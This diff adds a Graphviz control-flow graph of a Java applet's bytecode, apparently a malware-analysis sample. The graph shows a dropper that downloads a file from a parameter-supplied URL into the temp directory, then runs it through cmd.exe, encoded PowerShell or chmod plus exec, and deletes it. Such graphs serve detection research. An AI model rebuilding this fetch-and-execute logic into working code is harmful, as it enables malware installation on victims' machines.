@@ -1,0 +1,528 @@
+digraph "" {
+    "r0 := @this: Java"
+    "new java.util.Random"
+    "r0 := @this: Java"->"new java.util.Random";
+    "dup1.r"
+    "new java.util.Random"->"dup1.r";
+    "virtualinvoke <java.io.IOException: void printStackTrace()>"
+    "dup1.r"->"virtualinvoke <java.io.IOException: void printStackTrace()>";
+    "goto return"
+    "virtualinvoke <java.io.IOException: void printStackTrace()>"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <java.lang.Exception: void printStackTrace()>"
+    "dup1.r"->"virtualinvoke <java.lang.Exception: void printStackTrace()>";
+    "specialinvoke <java.util.Random: void <init>()>"
+    "dup1.r"->"specialinvoke <java.util.Random: void <init>()>";
+    "virtualinvoke <java.util.Random: long nextLong()>"
+    "specialinvoke <java.util.Random: void <init>()>"->"virtualinvoke <java.util.Random: long nextLong()>";
+    "staticinvoke <java.lang.Math: long abs(long)>"
+    "virtualinvoke <java.util.Random: long nextLong()>"->"staticinvoke <java.lang.Math: long abs(long)>";
+    "push 36"
+    "staticinvoke <java.lang.Math: long abs(long)>"->"push 36";
+    "staticinvoke <java.lang.Long: java.lang.String toString(long,int)>"
+    "push 36"->"staticinvoke <java.lang.Long: java.lang.String toString(long,int)>";
+    "store.r r1"
+    "staticinvoke <java.lang.Long: java.lang.String toString(long,int)>"->"store.r r1";
+    "new java.lang.StringBuilder"
+    "store.r r1"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"java.io.tmpdir\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"java.io.tmpdir\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"java.io.tmpdir\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "staticget <java.io.File: java.lang.String separator>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"staticget <java.io.File: java.lang.String separator>";
+    "staticget <java.io.File: java.lang.String separator>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "store.r r73"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r73";
+    "store.r r73"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"java.io.tmpdir\"";
+    "push \"java.io.tmpdir\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"staticget <java.io.File: java.lang.String separator>";
+    "staticget <java.io.File: java.lang.String separator>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "pop"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"pop";
+    "push \"os.name\""
+    "pop"->"push \"os.name\"";
+    "push \"os.name\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.String: java.lang.String toLowerCase()>";
+    "store.r r3"
+    "virtualinvoke <java.lang.String: java.lang.String toLowerCase()>"->"store.r r3";
+    "push \"os.arch\""
+    "store.r r3"->"push \"os.arch\"";
+    "push \"os.arch\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "store.r r4"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"store.r r4";
+    "push \"\""
+    "store.r r4"->"push \"\"";
+    "store.r r74"
+    "push \"\""->"store.r r74";
+    "store.r r74"->"push \"\"";
+    "store.r r75"
+    "push \"\""->"store.r r75";
+    "store.r r75"->"push \"\"";
+    "store.r $r46"
+    "push \"\""->"store.r $r46";
+    "store.r $r46"->"push \"\"";
+    "store.r $r51"
+    "push \"\""->"store.r $r51";
+    "push -1"
+    "store.r $r51"->"push -1";
+    "store.b b17"
+    "push -1"->"store.b b17";
+    "load.r r3"
+    "store.b b17"->"load.r r3";
+    "push \"win\""
+    "load.r r3"->"push \"win\"";
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"
+    "push \"win\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "iflt load.r r3"
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"iflt load.r r3";
+    "load.r r0"
+    "iflt load.r r3"->"load.r r0";
+    "push \"WINDOWS\""
+    "load.r r0"->"push \"WINDOWS\"";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"
+    "push \"WINDOWS\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r r74";
+    "store.r r74"->"load.r r0";
+    "push \"STUFF\""
+    "load.r r0"->"push \"STUFF\"";
+    "push \"STUFF\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r r75";
+    "store.r r75"->"load.r r0";
+    "push \"64\""
+    "load.r r0"->"push \"64\"";
+    "push \"64\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r $r46";
+    "store.r $r46"->"load.r r0";
+    "push \"86\""
+    "load.r r0"->"push \"86\"";
+    "push \"86\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r $r51";
+    "push 0"
+    "store.r $r51"->"push 0";
+    "push 0"->"store.b b17";
+    "store.b b17"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "load.r r73"
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "load.r r1"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \".exe\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".exe\"";
+    "push \".exe\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r73";
+    "goto load.r r74"
+    "store.r r73"->"goto load.r r74";
+    "load.r r74"
+    "goto load.r r74"->"load.r r74";
+    "virtualinvoke <java.lang.String: int length()>"
+    "load.r r74"->"virtualinvoke <java.lang.String: int length()>";
+    "ifle load.r r0"
+    "virtualinvoke <java.lang.String: int length()>"->"ifle load.r r0";
+    "ifle load.r r0"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.String: int length()>";
+    "virtualinvoke <java.lang.String: int length()>"->"ifle load.r r0";
+    "new java.net.URL"
+    "ifle load.r r0"->"new java.net.URL";
+    "new java.net.URL"->"dup1.r";
+    "dup1.r"->"load.r r74";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "load.r r74"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "virtualinvoke <java.net.URL: java.io.InputStream openStream()>"
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.io.InputStream openStream()>";
+    "virtualinvoke <java.net.URL: java.io.InputStream openStream()>"->"store.r r74";
+    "new java.io.BufferedInputStream"
+    "store.r r74"->"new java.io.BufferedInputStream";
+    "new java.io.BufferedInputStream"->"store.r r1";
+    "store.r r1"->"load.r r1";
+    "load.r r1"->"load.r r74";
+    "specialinvoke <java.io.BufferedInputStream: void <init>(java.io.InputStream)>"
+    "load.r r74"->"specialinvoke <java.io.BufferedInputStream: void <init>(java.io.InputStream)>";
+    "new java.io.File"
+    "specialinvoke <java.io.BufferedInputStream: void <init>(java.io.InputStream)>"->"new java.io.File";
+    "store.r r6"
+    "new java.io.File"->"store.r r6";
+    "load.r r6"
+    "store.r r6"->"load.r r6";
+    "load.r r6"->"load.r r73";
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"
+    "load.r r73"->"specialinvoke <java.io.File: void <init>(java.lang.String)>";
+    "new java.io.BufferedOutputStream"
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"->"new java.io.BufferedOutputStream";
+    "new java.io.BufferedOutputStream"->"store.r r3";
+    "store.r r3"->"load.r r3";
+    "new java.io.FileOutputStream"
+    "load.r r3"->"new java.io.FileOutputStream";
+    "new java.io.FileOutputStream"->"dup1.r";
+    "dup1.r"->"load.r r6";
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.io.File)>"
+    "load.r r6"->"specialinvoke <java.io.FileOutputStream: void <init>(java.io.File)>";
+    "specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>"
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.io.File)>"->"specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>";
+    "push 2048"
+    "specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>"->"push 2048";
+    "newarray"
+    "push 2048"->"newarray";
+    "newarray"->"store.r r6";
+    "store.r r6"->"load.r r1";
+    "load.r r1"->"load.r r6";
+    "virtualinvoke <java.io.BufferedInputStream: int read(byte[])>"
+    "load.r r6"->"virtualinvoke <java.io.BufferedInputStream: int read(byte[])>";
+    "store.i i0"
+    "virtualinvoke <java.io.BufferedInputStream: int read(byte[])>"->"store.i i0";
+    "load.i i0"
+    "store.i i0"->"load.i i0";
+    "ifgt load.r r3"
+    "load.i i0"->"ifgt load.r r3";
+    "goto load.r r3"
+    "ifgt load.r r3"->"goto load.r r3";
+    "goto load.r r3"->"load.r r3";
+    "virtualinvoke <java.io.OutputStream: void flush()>"
+    "load.r r3"->"virtualinvoke <java.io.OutputStream: void flush()>";
+    "virtualinvoke <java.io.OutputStream: void flush()>"->"load.r r3";
+    "virtualinvoke <java.io.OutputStream: void close()>"
+    "load.r r3"->"virtualinvoke <java.io.OutputStream: void close()>";
+    "virtualinvoke <java.io.OutputStream: void close()>"->"load.r r74";
+    "virtualinvoke <java.io.InputStream: void close()>"
+    "load.r r74"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"load.r r0";
+    "push \"nextPage\""
+    "load.r r0"->"push \"nextPage\"";
+    "push \"nextPage\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r r3";
+    "store.r r3"->"load.r r3";
+    "ifnull load.b b17"
+    "load.r r3"->"ifnull load.b b17";
+    "ifnull load.b b17"->"load.r r3";
+    "load.r r3"->"virtualinvoke <java.lang.String: int length()>";
+    "ifle load.b b17"
+    "virtualinvoke <java.lang.String: int length()>"->"ifle load.b b17";
+    "ifle load.b b17"->"new java.net.URL";
+    "new java.net.URL"->"store.r r1";
+    "store.r r1"->"load.r r1";
+    "load.r r1"->"load.r r3";
+    "load.r r3"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"load.r r0";
+    "virtualinvoke <Java: java.applet.AppletContext getAppletContext()>"
+    "load.r r0"->"virtualinvoke <Java: java.applet.AppletContext getAppletContext()>";
+    "virtualinvoke <Java: java.applet.AppletContext getAppletContext()>"->"load.r r1";
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"
+    "load.r r1"->"interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1";
+    "load.b b17"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"load.b b17";
+    "push 1"
+    "load.b b17"->"push 1";
+    "ifcmpge.b staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "push 1"->"ifcmpge.b staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "ifcmpge.b staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.io.File";
+    "new java.io.File"->"dup1.r";
+    "push \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\""
+    "dup1.r"->"push \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\"";
+    "push \"C:\\Windows\\System32\\WindowsPowershell\\v1.0\""->"specialinvoke <java.io.File: void <init>(java.lang.String)>";
+    "virtualinvoke <java.io.File: boolean exists()>"
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"->"virtualinvoke <java.io.File: boolean exists()>";
+    "ifeq load.r r75"
+    "virtualinvoke <java.io.File: boolean exists()>"->"ifeq load.r r75";
+    "load.r $r46"
+    "ifeq load.r r75"->"load.r $r46";
+    "load.r $r46"->"virtualinvoke <java.lang.String: int length()>";
+    "push 3"
+    "virtualinvoke <java.lang.String: int length()>"->"push 3";
+    "ifcmple.i load.r r75"
+    "push 3"->"ifcmple.i load.r r75";
+    "load.r r4"
+    "ifcmple.i load.r r75"->"load.r r4";
+    "load.r r4"->"push \"86\"";
+    "virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>"
+    "push \"86\""->"virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>";
+    "ifne load.r $r51"
+    "virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>"->"ifne load.r $r51";
+    "ifne load.r $r51"->"load.r r4";
+    "load.r r4"->"push \"64\"";
+    "push \"64\""->"virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>";
+    "ifeq load.r r4"
+    "virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>"->"ifeq load.r r4";
+    "load.r $r51"
+    "ifeq load.r r4"->"load.r $r51";
+    "load.r $r51"->"virtualinvoke <java.lang.String: int length()>";
+    "virtualinvoke <java.lang.String: int length()>"->"push 3";
+    "push 3"->"ifcmple.i load.r r75";
+    "new java.lang.ProcessBuilder"
+    "ifcmple.i load.r r75"->"new java.lang.ProcessBuilder";
+    "new java.lang.ProcessBuilder"->"dup1.r";
+    "push 5"
+    "dup1.r"->"push 5";
+    "push 5"->"newarray";
+    "newarray"->"store.r $r46";
+    "store.r $r46"->"load.r $r46";
+    "load.r $r46"->"push 0";
+    "push \"cmd\""
+    "push 0"->"push \"cmd\"";
+    "arraywrite.r"
+    "push \"cmd\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r46";
+    "load.r $r46"->"push 1";
+    "push \"/c\""
+    "push 1"->"push \"/c\"";
+    "push \"/c\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r46";
+    "push 2"
+    "load.r $r46"->"push 2";
+    "push \"powershell\""
+    "push 2"->"push \"powershell\"";
+    "push \"powershell\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r46";
+    "load.r $r46"->"push 3";
+    "push \"-EncodedCommand\""
+    "push 3"->"push \"-EncodedCommand\"";
+    "push \"-EncodedCommand\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r46";
+    "push 4"
+    "load.r $r46"->"push 4";
+    "push 4"->"load.r $r51";
+    "load.r $r51"->"arraywrite.r";
+    "arraywrite.r"->"load.r $r46";
+    "specialinvoke <java.lang.ProcessBuilder: void <init>(java.lang.String[])>"
+    "load.r $r46"->"specialinvoke <java.lang.ProcessBuilder: void <init>(java.lang.String[])>";
+    "virtualinvoke <java.lang.ProcessBuilder: java.lang.Process start()>"
+    "specialinvoke <java.lang.ProcessBuilder: void <init>(java.lang.String[])>"->"virtualinvoke <java.lang.ProcessBuilder: java.lang.Process start()>";
+    "virtualinvoke <java.lang.ProcessBuilder: java.lang.Process start()>"->"store.r $r46";
+    "store.r $r46"->"load.r $r46";
+    "virtualinvoke <java.lang.Process: java.io.OutputStream getOutputStream()>"
+    "load.r $r46"->"virtualinvoke <java.lang.Process: java.io.OutputStream getOutputStream()>";
+    "virtualinvoke <java.lang.Process: java.io.OutputStream getOutputStream()>"->"virtualinvoke <java.io.OutputStream: void close()>";
+    "virtualinvoke <java.io.OutputStream: void close()>"->"load.r $r46";
+    "virtualinvoke <java.lang.Process: java.io.InputStream getInputStream()>"
+    "load.r $r46"->"virtualinvoke <java.lang.Process: java.io.InputStream getInputStream()>";
+    "virtualinvoke <java.lang.Process: java.io.InputStream getInputStream()>"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"load.r $r46";
+    "virtualinvoke <java.lang.Process: java.io.InputStream getErrorStream()>"
+    "load.r $r46"->"virtualinvoke <java.lang.Process: java.io.InputStream getErrorStream()>";
+    "virtualinvoke <java.lang.Process: java.io.InputStream getErrorStream()>"->"virtualinvoke <java.io.InputStream: void close()>";
+    "goto load.r r75"
+    "virtualinvoke <java.io.InputStream: void close()>"->"goto load.r r75";
+    "load.r r75"
+    "goto load.r r75"->"load.r r75";
+    "load.r r75"->"virtualinvoke <java.lang.String: int length()>";
+    "virtualinvoke <java.lang.String: int length()>"->"push 3";
+    "ifcmpge.i load.r r75"
+    "push 3"->"ifcmpge.i load.r r75";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "ifcmpge.i load.r r75"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"cmd.exe /c \""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"cmd.exe /c \"";
+    "push \"cmd.exe /c \""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Process: int waitFor()>"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.lang.Process: int waitFor()>";
+    "virtualinvoke <java.lang.Process: int waitFor()>"->"pop";
+    "pop"->"load.r r75";
+    "load.r r75"->"virtualinvoke <java.lang.String: int length()>";
+    "virtualinvoke <java.lang.String: int length()>"->"push 3";
+    "ifcmple.i new java.io.File"
+    "push 3"->"ifcmple.i new java.io.File";
+    "ifcmple.i new java.io.File"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"cmd.exe /c \\\"\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"cmd.exe /c \\\"\"";
+    "push \"cmd.exe /c \\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \" \""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \" \"";
+    "push \" \""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r75";
+    "load.r r75"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\\"\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\\"\"";
+    "push \"\\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.lang.Process: int waitFor()>";
+    "virtualinvoke <java.lang.Process: int waitFor()>"->"pop";
+    "pop"->"new java.io.File";
+    "new java.io.File"->"dup1.r";
+    "dup1.r"->"load.r r73";
+    "load.r r73"->"specialinvoke <java.io.File: void <init>(java.lang.String)>";
+    "virtualinvoke <java.io.File: boolean delete()>"
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"->"virtualinvoke <java.io.File: boolean delete()>";
+    "virtualinvoke <java.io.File: boolean delete()>"->"pop";
+    "goto load.r r0"
+    "pop"->"goto load.r r0";
+    "goto load.r r0"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldput <Java: java.lang.Object initialized>"
+    "load.r r0"->"fieldput <Java: java.lang.Object initialized>";
+    "fieldput <Java: java.lang.Object initialized>"->"goto return";
+    "ifeq load.r r4"->"load.r r4";
+    "push \"i\""
+    "load.r r4"->"push \"i\"";
+    "push \"i\""->"virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>";
+    "virtualinvoke <java.lang.String: boolean contains(java.lang.CharSequence)>"->"ifeq load.r r75";
+    "ifeq load.r r75"->"load.r $r46";
+    "load.r $r46"->"virtualinvoke <java.lang.String: int length()>";
+    "virtualinvoke <java.lang.String: int length()>"->"push 3";
+    "push 3"->"ifcmple.i load.r r75";
+    "ifcmple.i load.r r75"->"new java.lang.ProcessBuilder";
+    "new java.lang.ProcessBuilder"->"dup1.r";
+    "dup1.r"->"push 5";
+    "push 5"->"newarray";
+    "newarray"->"store.r $r51";
+    "store.r $r51"->"load.r $r51";
+    "load.r $r51"->"push 0";
+    "push 0"->"push \"cmd\"";
+    "push \"cmd\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r51";
+    "load.r $r51"->"push 1";
+    "push 1"->"push \"/c\"";
+    "push \"/c\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r51";
+    "load.r $r51"->"push 2";
+    "push 2"->"push \"powershell\"";
+    "push \"powershell\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r51";
+    "load.r $r51"->"push 3";
+    "push 3"->"push \"-EncodedCommand\"";
+    "push \"-EncodedCommand\""->"arraywrite.r";
+    "arraywrite.r"->"load.r $r51";
+    "load.r $r51"->"push 4";
+    "push 4"->"load.r $r46";
+    "load.r $r46"->"arraywrite.r";
+    "arraywrite.r"->"load.r $r51";
+    "load.r $r51"->"specialinvoke <java.lang.ProcessBuilder: void <init>(java.lang.String[])>";
+    "specialinvoke <java.lang.ProcessBuilder: void <init>(java.lang.String[])>"->"virtualinvoke <java.lang.ProcessBuilder: java.lang.Process start()>";
+    "virtualinvoke <java.lang.ProcessBuilder: java.lang.Process start()>"->"store.r $r46";
+    "store.r $r46"->"load.r $r46";
+    "load.r $r46"->"virtualinvoke <java.lang.Process: java.io.OutputStream getOutputStream()>";
+    "virtualinvoke <java.lang.Process: java.io.OutputStream getOutputStream()>"->"virtualinvoke <java.io.OutputStream: void close()>";
+    "virtualinvoke <java.io.OutputStream: void close()>"->"load.r $r46";
+    "load.r $r46"->"virtualinvoke <java.lang.Process: java.io.InputStream getInputStream()>";
+    "virtualinvoke <java.lang.Process: java.io.InputStream getInputStream()>"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"load.r $r46";
+    "load.r $r46"->"virtualinvoke <java.lang.Process: java.io.InputStream getErrorStream()>";
+    "virtualinvoke <java.lang.Process: java.io.InputStream getErrorStream()>"->"virtualinvoke <java.io.InputStream: void close()>";
+    "ifcmpge.b staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"/bin/chmod 755 \""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"/bin/chmod 755 \"";
+    "push \"/bin/chmod 755 \""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.lang.Process: int waitFor()>";
+    "virtualinvoke <java.lang.Process: int waitFor()>"->"pop";
+    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.lang.Process: int waitFor()>";
+    "virtualinvoke <java.lang.Process: int waitFor()>"->"pop";
+    "pop"->"new java.io.File";
+    "new java.io.File"->"dup1.r";
+    "dup1.r"->"load.r r73";
+    "load.r r73"->"specialinvoke <java.io.File: void <init>(java.lang.String)>";
+    "specialinvoke <java.io.File: void <init>(java.lang.String)>"->"virtualinvoke <java.io.File: boolean delete()>";
+    "virtualinvoke <java.io.File: boolean delete()>"->"pop";
+    "ifgt load.r r3"->"load.r r3";
+    "load.r r3"->"load.r r6";
+    "load.r r6"->"push 0";
+    "push 0"->"load.i i0";
+    "virtualinvoke <java.io.OutputStream: void write(byte[],int,int)>"
+    "load.i i0"->"virtualinvoke <java.io.OutputStream: void write(byte[],int,int)>";
+    "goto load.r r1"
+    "virtualinvoke <java.io.OutputStream: void write(byte[],int,int)>"->"goto load.r r1";
+    "iflt load.r r3"->"load.r r3";
+    "push \"mac\""
+    "load.r r3"->"push \"mac\"";
+    "push \"mac\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"iflt load.r r3";
+    "iflt load.r r3"->"load.r r0";
+    "push \"OSX\""
+    "load.r r0"->"push \"OSX\"";
+    "push \"OSX\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r r74";
+    "store.r r74"->"push 1";
+    "push 1"->"store.b b17";
+    "store.b b17"->"load.r r73";
+    "push \"/var/folders/\""
+    "load.r r73"->"push \"/var/folders/\"";
+    "virtualinvoke <java.lang.String: boolean startsWith(java.lang.String)>"
+    "push \"/var/folders/\""->"virtualinvoke <java.lang.String: boolean startsWith(java.lang.String)>";
+    "ifeq new java.lang.StringBuilder"
+    "virtualinvoke <java.lang.String: boolean startsWith(java.lang.String)>"->"ifeq new java.lang.StringBuilder";
+    "push \"/tmp/\""
+    "ifeq new java.lang.StringBuilder"->"push \"/tmp/\"";
+    "push \"/tmp/\""->"store.r r73";
+    "store.r r73"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
